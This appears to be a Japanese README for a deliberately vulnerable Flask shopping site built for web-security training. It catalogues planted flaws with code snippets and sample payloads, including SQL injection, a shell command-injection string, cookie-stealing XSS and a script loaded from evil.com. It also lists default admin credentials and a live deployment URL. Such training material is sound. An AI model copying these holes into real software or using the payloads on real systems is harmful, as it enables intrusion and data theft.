# 🔒 脆弱なショッピングモール - セキュリティ脆弱性レポート

## 📋 プロジェクト概要

**プロジェクト名**: 脆弱なショッピングモール  
**目的**: ウェブセキュリティ教育・ペネトレーションテスト演習  
**技術スタック**: Flask 2.3.3, PostgreSQL (Supabase), Bootstrap 5  
**デプロイ**: Vercel (本番環境)  

---

## 🚀 フェーズ別実装状況

### ✅ Phase 1: コード分析 (完了)
- ソースコード構造分析
- 依存関係調査
- 既存脆弱性の特定

### ✅ Phase 2: インフラ構築 (完了)
- PostgreSQL データベース移行 (Supabase)
- Vercel デプロイメント設定
- 管理者パネル機能拡張
- 商品カテゴリ最適化

### ✅ Phase 3: XSS脆弱性追加 (完了)
- Reflected XSS実装
- Stored XSS実装  
- DOM-based XSS実装
- XSSテストページ作成

---

## 🔍 実装済み脆弱性カタログ

### 1. 💉 SQLインジェクション
**場所**: `/search` エンドポイント  
**危険度**: 🔴 High  
```python
sql_query = f"SELECT * FROM products WHERE name LIKE '%{query}%'"
```
**攻撃例**: `'; DROP TABLE products; --`

### 2. 🖥️ コマンドインジェクション
**場所**: `/admin/command` (ping test)  
**危険度**: 🔴 High  
```python
result = subprocess.check_output(f"ping {ping_option} {target}", shell=True)
```
**攻撃例**: `8.8.8.8; whoami`

### 3. ⚡ XSS (Cross-Site Scripting)

#### 3.1 Reflected XSS
**場所**: `/search` 検索結果表示  
**危険度**: 🟠 Medium  
```html
<p>入力された検索文字列: <code>{{ query|safe }}</code></p>
```
**攻撃例**: `<script>alert('XSS')</script>`

#### 3.2 Stored XSS  
**場所**: 商品レビューシステム  
**危険度**: 🔴 High  
```html
<div class="border rounded p-4 bg-light">
    {{ review[4] | safe }}
</div>
```
**攻撃例**: `<img src=x onerror=alert(document.cookie)>`

#### 3.3 DOM-based XSS
**場所**: `/xss-test` ページ  
**危険度**: 🟠 Medium  
```javascript
resultDiv.innerHTML = '入力された内容: ' + input;
```

### 4. 🔐 認証・認可の不備

#### 4.1 セッション管理の脆弱性
**場所**: 全体的なセッション処理  
**危険度**: 🟠 Medium  
- セッション固定攻撃の可能性
- ログアウト時のセッション無効化不備

#### 4.2 管理者権限チェック不備
**場所**: `/admin/*` エンドポイント  
**危険度**: 🔴 High  
```python
if session.get('role') != 'admin':
    # 簡易的なチェックのみ
```

### 5. 📁 ファイルアップロード脆弱性
**場所**: プロフィール画像・添付ファイル  
**危険度**: 🟠 Medium  
- ファイル拡張子チェック不十分
- ファイル内容検証なし
- Path Traversal攻撃の可能性

### 6. 🌐 CSRF (Cross-Site Request Forgery)
**場所**: 全フォーム処理  
**危険度**: 🟠 Medium  
- CSRFトークン実装なし
- 重要操作の二次認証なし

### 7. 📋 情報漏洩
**場所**: エラーメッセージ、デバッグ情報  
**危険度**: 🟡 Low  
- スタックトレースの表示
- データベース構造の露出

### 8. 🔒 暗号化不備
**場所**: パスワード保存、通信  
**危険度**: 🟠 Medium  
- 弱いハッシュ化アルゴリズム使用
- HTTPS強制なし

### 9. 📊 ビジネスロジックの脆弱性
**場所**: 価格操作、在庫管理  
**危険度**: 🟠 Medium  
- 負の値での商品購入
- 在庫数量チェック不備

### 10. 📧 メール機能の脆弱性
**場所**: `/mail/*` エンドポイント  
**危険度**: 🟡 Low  
- ヘッダーインジェクション
- メール送信制限なし

---

## 🛠️ テスト環境構成

### ローカル開発環境
```bash
http://localhost:5000
```

### 本番環境 (Vercel)
```bash
https://exploit-server1.vercel.app
```

### データベース (Supabase PostgreSQL)
```
Host: aws-1-ap-northeast-1.pooler.supabase.com
Port: 6543
Database: postgres
```

---

## 🎯 XSSテストページ機能

### アクセス方法
```
http://localhost:5000/xss-test
```

### 提供機能
1. **Reflected XSSテスト**
   - 検索機能によるXSSペイロード実行
   - リアルタイムテスト環境

2. **Stored XSSテスト**  
   - レビューシステムでの永続的XSS
   - データベース格納型攻撃

3. **DOM-based XSSテスト**
   - JavaScript DOM操作による攻撃
   - URLフラグメント経由の攻撃

### サンプルペイロード
```html
<!-- 基本的なスクリプト実行 -->
<script>alert('XSS')</script>

<!-- 画像タグでのイベントハンドラ -->
<img src=x onerror=alert('XSS')>

<!-- SVGタグでの実行 -->
<svg onload=alert('XSS')>

<!-- クッキー情報の取得 -->
<script>alert(document.cookie)</script>

<!-- 外部スクリプトの読み込み -->
<script src="http://evil.com/xss.js"></script>
```

---

## 🔧 管理者パネル機能

### アクセス情報
- **URL**: `/admin/dashboard`
- **管理者アカウント**: admin / admin123

### 追加機能
1. **システムコマンド実行** (`/admin/command`)
   - OS検出機能 (Windows/Linux対応)
   - Ping テスト (コマンドインジェクション脆弱性)

2. **データベース管理** (`/admin/database`)
   - SQLクエリ直接実行
   - バックアップ/復元機能

3. **ユーザー管理** (`/admin/users`)
   - 権限変更機能
   - パスワードリセット

---

## 📦 商品カテゴリシステム

### 実装済みカテゴリ
- **電子機器** (3商品): ノートパソコン、スマートフォン、無線イヤホン
- **家具** (2商品): オフィスチェア、木製テーブル  
- **雑貨** (3商品): 文房具セット、キッチン用品、インテリア雑貨

### フィルタリング機能
```
/products?category=電子機器
/products?category=家具
/products?category=雑貨
```

---

## ⚠️ セキュリティ警告

> **重要**: このアプリケーションは教育目的のために意図的に脆弱性を含んでいます。
> 
> - 本番環境では絶対に使用しないでください
> - テスト環境は隔離されたネットワークで実行してください
> - 実際の個人情報は入力しないでください
> - ペネトレーションテストは許可された環境でのみ実行してください

---

## 📚 学習リソース

### 参考資料
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

### 推奨ツール
- **Burp Suite**: Webアプリケーション脆弱性スキャナ
- **OWASP ZAP**: オープンソース脆弱性スキャナ  
- **SQLMap**: SQLインジェクション自動化ツール

---

## 🎓 演習課題

### 初級編
1. 検索機能でReflected XSSを実行せよ
2. レビュー機能でStored XSSを実行せよ
3. 管理者パネルでコマンドインジェクションを実行せよ

### 中級編
1. SQLインジェクションでデータベース構造を特定せよ
2. CSRFを利用して他ユーザーの商品購入を実行せよ
3. ファイルアップロード機能でWebShellをアップロードせよ

### 上級編
1. セッション固定攻撃を実行せよ
2. ビジネスロジックの脆弱性を利用して無料で商品を購入せよ
3. 複数の脆弱性を組み合わせた攻撃チェーンを構築せよ

---

## 📞 サポート

演習中に問題が発生した場合は、各機能のエラーメッセージやログを確認し、
適切なペイロードの調整を行ってください。

**最終更新**: 2024年12月 (Phase 3完了)